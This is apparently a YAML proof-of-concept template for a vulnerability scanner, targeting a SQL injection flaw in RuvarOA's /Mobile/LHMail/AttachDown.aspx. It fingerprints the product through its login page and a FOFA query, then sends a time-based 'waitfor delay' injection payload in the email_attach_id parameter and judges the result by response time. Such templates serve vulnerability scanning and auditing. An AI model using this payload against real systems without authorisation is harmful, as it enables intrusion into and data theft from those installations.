id: poc-yaml-ruvaroa-attachdown-sqli
info:
  name: RuvarOA AttachDown SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: ruvar-oa
  fofa: body="txt_admin_key"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /login.aspx
  expression: status_code == 200 && contains(body,"txt_admin_key")
- method: GET
  path: /Mobile/LHMail/AttachDown.aspx?email_attach_id=1%27)+waitfor+delay+%270:0:{{.t1}}%27+--+
  expression: "status_code == 200 && \nbody == \"\" &&\nduration > t1 &&\nduration\
    \ < t2\n"
transport: http
